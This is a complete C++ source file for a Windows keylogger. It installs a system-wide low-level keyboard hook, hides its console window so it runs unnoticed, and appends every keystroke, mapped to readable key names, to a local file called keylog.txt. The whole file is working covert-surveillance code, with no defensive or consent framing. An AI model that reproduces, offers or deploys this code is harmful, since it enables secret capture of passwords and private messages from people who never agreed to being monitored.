#include <windows.h>
#include <iostream>
#include <fstream>
#include <unordered_map>

// Global variable to hold the log file stream
std::ofstream logFile;

// Function to map virtual key codes to human-readable descriptions
std::string GetKeyName(DWORD vkCode) {
    std::unordered_map<DWORD, std::string> keyMap = {
        {VK_LBUTTON, "Left Mouse Button"},
        {VK_RBUTTON, "Right Mouse Button"},
        {VK_CANCEL, "Control-Break Processing"},
        {VK_MBUTTON, "Middle Mouse Button"},
        {VK_XBUTTON1, "X1 Mouse Button"},
        {VK_XBUTTON2, "X2 Mouse Button"},
        {VK_BACK, "Backspace"},
        {VK_TAB, "Tab"},
        {VK_CLEAR, "Clear"},
        {VK_RETURN, "Enter"},
        {VK_SHIFT, "Shift"},
        {VK_CONTROL, "Control"},
        {VK_MENU, "Alt"},
        {VK_PAUSE, "Pause"},
        {VK_CAPITAL, "Caps Lock"},
        {VK_KANA, "IME Kana Mode"},
        {VK_HANGUL, "IME Hangul Mode"},
        {VK_JUNJA, "IME Junja Mode"},
        {VK_FINAL, "IME Final Mode"},
        {VK_HANJA, "IME Hanja Mode"},
        {VK_KANJI, "IME Kanji Mode"},
        {VK_ESCAPE, "Escape"},
        {VK_CONVERT, "IME Convert"},
        {VK_NONCONVERT, "IME NonConvert"},
        {VK_ACCEPT, "IME Accept"},
        {VK_MODECHANGE, "IME Mode Change Request"},
        {VK_SPACE, "Space"},
        {VK_PRIOR, "Page Up"},
        {VK_NEXT, "Page Down"},
        {VK_END, "End"},
        {VK_HOME, "Home"},
        {VK_LEFT, "Left Arrow"},
        {VK_UP, "Up Arrow"},
        {VK_RIGHT, "Right Arrow"},
        {VK_DOWN, "Down Arrow"},
        {VK_SELECT, "Select"},
        {VK_PRINT, "Print"},
        {VK_EXECUTE, "Execute"},
        {VK_SNAPSHOT, "Print Screen"},
        {VK_INSERT, "Insert"},
        {VK_DELETE, "Delete"},
        {VK_HELP, "Help"},
        {VK_LWIN, "Left Windows Key"},
        {VK_RWIN, "Right Windows Key"},
        {VK_APPS, "Applications Key"},
        {VK_SLEEP, "Sleep"},
        {VK_NUMPAD0, "Numpad 0"},
        {VK_NUMPAD1, "Numpad 1"},
        {VK_NUMPAD2, "Numpad 2"},
        {VK_NUMPAD3, "Numpad 3"},
        {VK_NUMPAD4, "Numpad 4"},
        {VK_NUMPAD5, "Numpad 5"},
        {VK_NUMPAD6, "Numpad 6"},
        {VK_NUMPAD7, "Numpad 7"},
        {VK_NUMPAD8, "Numpad 8"},
        {VK_NUMPAD9, "Numpad 9"},
        {VK_MULTIPLY, "Numpad *"},
        {VK_ADD, "Numpad +"},
        {VK_SEPARATOR, "Numpad Separator"},
        {VK_SUBTRACT, "Numpad -"},
        {VK_DECIMAL, "Numpad ."},
        {VK_DIVIDE, "Numpad /"},
        {VK_F1, "F1"},
        {VK_F2, "F2"},
        {VK_F3, "F3"},
        {VK_F4, "F4"},
        {VK_F5, "F5"},
        {VK_F6, "F6"},
        {VK_F7, "F7"},
        {VK_F8, "F8"},
        {VK_F9, "F9"},
        {VK_F10, "F10"},
        {VK_F11, "F11"},
        {VK_F12, "F12"},
        {VK_F13, "F13"},
        {VK_F14, "F14"},
        {VK_F15, "F15"},
        {VK_F16, "F16"},
        {VK_F17, "F17"},
        {VK_F18, "F18"},
        {VK_F19, "F19"},
        {VK_F20, "F20"},
        {VK_F21, "F21"},
        {VK_F22, "F22"},
        {VK_F23, "F23"},
        {VK_F24, "F24"},
        {VK_NUMLOCK, "Num Lock"},
        {VK_SCROLL, "Scroll Lock"},
        {VK_LSHIFT, "Left Shift"},
        {VK_RSHIFT, "Right Shift"},
        {VK_LCONTROL, "Left Control"},
        {VK_RCONTROL, "Right Control"},
        {VK_LMENU, "Left Alt"},
        {VK_RMENU, "Right Alt"},
        {VK_BROWSER_BACK, "Browser Back"},
        {VK_BROWSER_FORWARD, "Browser Forward"},
        {VK_BROWSER_REFRESH, "Browser Refresh"},
        {VK_BROWSER_STOP, "Browser Stop"},
        {VK_BROWSER_SEARCH, "Browser Search"},
        {VK_BROWSER_FAVORITES, "Browser Favorites"},
        {VK_BROWSER_HOME, "Browser Home"},
        {VK_VOLUME_MUTE, "Volume Mute"},
        {VK_VOLUME_DOWN, "Volume Down"},
        {VK_VOLUME_UP, "Volume Up"},
        {VK_MEDIA_NEXT_TRACK, "Next Track"},
        {VK_MEDIA_PREV_TRACK, "Previous Track"},
        {VK_MEDIA_STOP, "Stop Media"},
        {VK_MEDIA_PLAY_PAUSE, "Play/Pause Media"},
        {VK_LAUNCH_MAIL, "Launch Mail"},
        {VK_LAUNCH_MEDIA_SELECT, "Launch Media Select"},
        {VK_LAUNCH_APP1, "Launch Application 1"},
        {VK_LAUNCH_APP2, "Launch Application 2"},
        {VK_OEM_1, "OEM Specific Key 1"},
        {VK_OEM_PLUS, "OEM Plus"},
        {VK_OEM_COMMA, "OEM Comma"},
        {VK_OEM_MINUS, "OEM Minus"},
        {VK_OEM_PERIOD, "OEM Period"},
        {VK_OEM_2, "OEM Specific Key 2"},
        {VK_OEM_3, "OEM Specific Key 3"},
        {VK_OEM_4, "OEM Specific Key 4"},
        {VK_OEM_5, "OEM Specific Key 5"},
        {VK_OEM_6, "OEM Specific Key 6"},
        {VK_OEM_7, "OEM Specific Key 7"},
        {VK_OEM_8, "OEM Specific Key 8"},
        {VK_OEM_102, "OEM Specific Key 102"},
        {VK_PROCESSKEY, "Process Key"},
        {VK_PACKET, "Packet"},
        {VK_ATTN, "Attn"},
        {VK_CRSEL, "CrSel"},
        {VK_EXSEL, "ExSel"},
        {VK_EREOF, "Erase EOF"},
        {VK_PLAY, "Play"},
        {VK_ZOOM, "Zoom"},
        {VK_NONAME, "No Name"},
        {VK_PA1, "PA1"},
        {VK_OEM_CLEAR, "Clear"}
    };

    // Check if the vkCode is within the printable ASCII range
    if (vkCode >= 0x30 && vkCode <= 0x39) { // Numbers 0-9
        return std::string(1, char(vkCode));
    } else if (vkCode >= 0x41 && vkCode <= 0x5A) { // Letters A-Z
        return std::string(1, char(vkCode));
    }

    // Return the description if available, otherwise the vkCode as a string
    auto it = keyMap.find(vkCode);
    if (it != keyMap.end()) {
        return it->second;
    }
    return "Unknown Key (" + std::to_string(vkCode) + ")";
}

// Callback function for the keyboard hook
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        // Log the key press
        std::string keyName = GetKeyName(vkCode);
        logFile << "Key Pressed: " << keyName << " (Code: " << vkCode << ")" << std::endl;
        logFile.flush();  // Ensure data is written to the file immediately
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to detach the console window
void DetachConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE); // Hide the console window
}

int main() {
    // Open log file in append mode
    logFile.open("keylog.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file." << std::endl;
        return 1;
    }

    // Detach the console to make the application run in the background
    DetachConsole();

    // Set the low-level keyboard hook
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    if (hhkLowLevelKybd == NULL) {
        std::cerr << "Failed to set hook." << std::endl;
        return 1;
    }

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up: unhook and close the log file
    UnhookWindowsHookEx(hhkLowLevelKybd);
    logFile.close();
    return 0;
}
